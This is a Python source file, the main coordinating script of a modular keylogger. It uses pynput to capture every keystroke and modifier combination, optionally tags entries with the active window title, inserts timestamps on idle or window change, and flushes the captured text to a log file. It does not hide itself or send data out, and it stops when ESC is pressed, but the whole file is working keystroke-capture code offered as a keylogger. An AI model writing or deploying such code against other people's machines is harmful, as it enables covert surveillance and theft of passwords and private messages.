"""
Main keylogger script coordinating modules:
- key_handler for key press/release logic
- buffer_manager for buffer and file writes
- window_detector for active window tracking
"""

import time
import threading
import signal
import sys

from pynput.keyboard import Listener as KeyboardListener, Key

from advanced.buffer_manager import buffer_manager
from advanced import key_handler
from advanced import window_detector
from advanced.config import IDLE_TIME, FLUSH_DELAY, PER_APP_LOGGING, LOG_FILE  # Import config

# --- Global State ---
last_input_time = time.time()
last_window_title = None
flush_timer = None
lock = threading.Lock()

def log_timestamp_header(window_title=None):
    """
    Append a timestamp header to the buffer and flush to log file.
    Includes active window title if PER_APP_LOGGING is enabled.
    """
    now_str = time.strftime("%Y-%m-%d %H:%M:%S")
    if PER_APP_LOGGING and window_title:
        buffer_manager.buffer_append(f"\n{now_str} - {window_title}\n")
    else:
        buffer_manager.buffer_append(f"\n{now_str}\n")
    buffer_manager.flush_buffer(LOG_FILE)

def delayed_flush():
    """Flush the buffer to disk, used by the flush timer."""
    global flush_timer
    with lock:
        flush_timer = None
        buffer_manager.flush_buffer(LOG_FILE)

def reset_flush_timer():
    """Cancel existing flush timer and start a new one."""
    global flush_timer
    with lock:
        if flush_timer:
            flush_timer.cancel()
        flush_timer = threading.Timer(FLUSH_DELAY, delayed_flush)
        flush_timer.daemon = True
        flush_timer.start()

def maybe_log_new_context():
    """
    Log a timestamp header if:
    - The user has been idle longer than IDLE_TIME, or
    - The active window has changed (if PER_APP_LOGGING is enabled).
    """
    global last_input_time, last_window_title

    now = time.time()
    idle_triggered = (now - last_input_time) > IDLE_TIME

    current_window = None
    if PER_APP_LOGGING:
        try:
            current_window = window_detector.get_active_window_title()
        except Exception:
            current_window = None

    window_changed = PER_APP_LOGGING and (current_window != last_window_title)

    if idle_triggered or window_changed:
        key_handler.flush_repeat()
        buffer_manager.flush_buffer(LOG_FILE)

        last_input_time = now
        last_window_title = current_window

        log_timestamp_header(current_window)

def on_press(key):
    """Handler for key press events."""
    global last_input_time

    maybe_log_new_context()
    last_input_time = time.time()
    reset_flush_timer()

    if key_handler.is_modifier_key(key):
        key_handler.track_modifier(key)
        return

    if key_handler.held_modifiers:
        key_handler.handle_with_modifiers(key)
    else:
        key_handler.handle_without_modifiers(key)

def on_release(key):
    """Handler for key release events."""
    if key in key_handler.held_modifiers:
        key_handler.release_modifier(key)

    if key == Key.esc:
        # Graceful shutdown on ESC key
        key_handler.flush_repeat()
        buffer_manager.flush_buffer(LOG_FILE)
        buffer_manager.write_to_file("\n#end of file\n", LOG_FILE)
        if flush_timer:
            flush_timer.cancel()
        return False

def signal_handler(signum, frame):
    """Handle termination signals gracefully."""
    key_handler.flush_repeat()
    buffer_manager.flush_buffer(LOG_FILE)
    buffer_manager.write_to_file("\n#end of file\n", LOG_FILE)
    if flush_timer:
        flush_timer.cancel()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

if __name__ == "__main__":
    initial_title = None
    if PER_APP_LOGGING:
        try:
            initial_title = window_detector.get_active_window_title()
        except Exception:
            initial_title = None

    log_timestamp_header(initial_title)

    with KeyboardListener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
